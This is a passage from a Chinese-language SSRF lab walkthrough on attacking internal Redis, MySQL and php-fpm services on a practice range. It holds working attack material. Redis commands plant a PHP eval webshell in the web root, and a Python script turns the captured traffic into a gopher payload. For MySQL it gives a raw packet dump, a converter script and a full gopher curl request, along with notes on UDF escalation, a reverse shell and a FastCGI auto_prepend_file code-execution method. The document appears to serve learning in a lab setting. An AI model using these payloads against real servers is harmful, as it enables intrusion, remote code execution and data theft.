5. **匹配成功 → 直接放行 → 不需要密码**
所以：  
**“免密”的本质不是没有认证，而是用“密钥”代替“密码”。**
但是我通过SSRF强行写入我自己的公钥，就相当于我已经把钥匙插在钥匙孔了，登录自然就不需要密码了。
## redis授权
`http://172.72.23.28` 该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令![](/image/275.png)
但是除了6379端口，还开了80端口，存在一个明显的文件包含漏洞。这样就可以读取一些配置文件。
读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：
```payload
/etc/redis.conf
/etc/redis/redis.conf
/usr/local/redis/etc/redis.conf
/opt/redis/ect/redis.conf
```
成功在`/etc/redis.conf`读取到文件，![](/image/276.png)
找到密码。
在用密码登录![](/image/277.png)
拿到密码的话就可以正常和 Redis 进行交互了，可以试一下dict伪协议
```
dict://172.72.23.28:6379/auth p@aaw0rd
```
可以认证成功，但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。
所以只可以用gopher伪协议。
gopher 协议因为需要原生数据包，所以我们需要抓取到 Redis 的请求数据包。可以使用 Linux 自带的 socat 命令来进行本地的模拟抓取：
```
socat -v tcp-listen:4444,fork tcp-connect:127.0.0.1:6379
redis-cli -h 127.0.0.1 -p 4444
127.0.0.1:4444>
```

```bash
# 认证 redis
127.0.0.1:4444> auth P@ssw0rd
OK

# 清空 key
127.0.0.1:4444> flushall

# 设置要操作的路径为网站根目录
127.0.0.1:4444> config set dir /var/www/html

# 在网站目录下创建 shell.php 文件
127.0.0.1:4444> config set dbfilename shell.php

# 设置 shell.php 的内容
127.0.0.1:4444> set x "\n<?php eval($_GET[1]);?>\n"

# 保存上述操作
127.0.0.1:4444> save
```
这样就可以在监听端口看到流量。![](/image/278.png)
去掉一些报错的再简化。就得到了完整的流量![](/image/279.png)
```
*2\r
$4\r
auth\r
$8\r
P@ssw0rd\r
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$13\r
/var/www/html\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$1\r
x\r
$25\r

<?php eval($_GET[1]);?>
\r
*1\r
$4\r
save\r
```
可以看到每行都是以 `\r` 结尾的，但是 Redis 的协议是以 CRLF (`\r\n`) 结尾，所以转换的时候需要把 `\r` 转换为 `\r\n`，然后其他全部进行 两次 URL 编码，这里借助 BP 就很容易解决：
这里直接用刚才的脚本，先把所有的\r都去掉。
```python
import urllib.parse  
  
test=\  
"""*2  
$4  
auth  
$8  
P@ssw0rd  
*1  
$8  
flushall  
*4  
$6  
config  
$3  
set  
$3  
dir  
$13  
/var/www/html  
*4  
$6  
config  
$3  
set  
$10  
dbfilename  
$9  
shell.php  
*3  
$3  
set  
$1  
x  
$25  
  
<?php eval($_GET[1]);?>  
  
*1  
$4  
save  
"""  
#后面一定要有回车，回车表示http请求结束。  
tmp = urllib.parse.quote(test)  
new = tmp.replace("%0A","%0D%0A")  
result = 'gopher://172.72.23.28:6379/_'+urllib.parse.quote(new)  
print(result)
```
再`http://172.72.23.28:6379/shell.php?1=system(env);`就可以命令执行了。![](/image/280.png)
## MySQL未授权
适用于MySQL 空密码可以登录，靶场在数据库下和系统下各放了一个 flag，通过 SSRF 可以和数据库进行交互，SSRF 进行 UDF 提权可以拿到系统下的 flag：
![](/image/281.png)
MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包，所以还是和攻击 Redis 应用一样，这里我们使用 tcpdump 来监听抓取 3306 的认证的原始数据包：
```bash
# lo 回环接口网卡 -w 报错 pcapng 数据包
tcpdump -i lo port 3306 -w mysql.pcapng
```
然后本地使用 MySQL 来执行一些测试命令：
```mysql
$ mysql -h127.0.0.1 -uroot -e "select * from flag.test union select user(),'www.sqlsec.com';"
+----------------+----------------------------------------+
| id             | flag                                   |
+----------------+----------------------------------------+
| 1              | flag{71***************************316} |
| root@127.0.0.1 | www.sqlsec.com                         |
+----------------+----------------------------------------+
```
中止 tcpdump 使用 Wireshark 打开 `mysql.pcapng` 数据包，追踪 TCP 流 然后过滤出发给 3306 的数据：
这里还不会用wireshark抓包，以后学一下，就先抄作者的包吧。
保存为原始数据「Show data as `Raw`」，并且整理成 1 行：
```payload
a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001
```
用脚本（这是py3的脚本）
```python
import sys

def results(s):
    a=[s[i:i+2] for i in range(0,len(s),2)]
    return "curl gopher://127.0.0.1:3306/_%"+"%".join(a)

if __name__=="__main__":
    s=sys.argv[1]
    print(results(s))
```
![](/image/282.png)
这样就得到payload，再在本地curl一下
![](/image/283.png)

从图上可以看到 gopher 请求的数据包已经成功执行了，user () 和 数据库中的 flag 都可查询出来了。
如果 curl 请求提示是一个二进制文件无法直接显示，所可以使用 `--output` 来输出到文件中，然后手动 cat 文件同样也可以看到 gopher 协议交互 MySQL 的执行结果：
```bash
$ curl gopher://127.0.0.1:3306/_xxx --output mysql_result  
```
SSRF 攻击 MySQL 仅仅查询数据意义不大，不如直接 UDF 提权然后反弹 shell 出来更加直接，下面尝试使用 SSRF 来 UDF 提权内网的 MySQL 应用，
```bash
$ mysql -h127.0.0.1 -uroot -e "show variables like 
'%plugin%';"
```
tcpdump 监听，使用 Wirshark 分析导出原始数据：
使用脚本将原始数据转换 gopher 协议，得到的数据如下
```bash
curl gopher://127.0.0.1:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01  
```
后面提权就看不懂了，以后有机会在学。
## FastCGI
FastCGI指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。
众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要**通过浏览器进行解析**，而动态网站需要一个**额外的编译解析**的过程。以Apache为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web容器就会把这个请求进行简单的处理，然后如果使用的是CGI，就会启动CGI程序（对应的就是PHP解释器）。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。

这里说的是使用CGI，而FastCGI就相当于高性能的CGI，与CGI不同的是它**像一个常驻的CGI**，在启动后会一直运行着，不需要每次处理数据时都启动一次，**所以FastCGI的主要行为是将CGI解释器进程保持在内存中**，并因此获得较高的性能 。
### php-fpm
FPM（FastCGI 进程管理器）可以说是FastCGI的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。
攻击FastCGI的主要原理就是，在设置环境变量实际请求中会出现一个`SCRIPT_FILENAME': '/var/www/html/index.php`这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。

而在PHP 5.3.9后来的版本中，PHP增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在PHP允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改PHP的设置。

那么当设置PHP环境变量为：`auto_prepend_file = php://input;allow_url_include = On`时，就会在执行PHP脚本之前包含环境变量`auto_prepend_file`所指向的文件内容，`php://input`也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。

### 攻击
假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行。
这里要用到工具Gopherus,这是一个用python2写的工具。
直接用工具生成，
![](/image/284.png)
这样得到的payload再url编码一次，不用hackbar的url编码，可以用bp的对特殊字符编码。
发送payload就可以执行成功。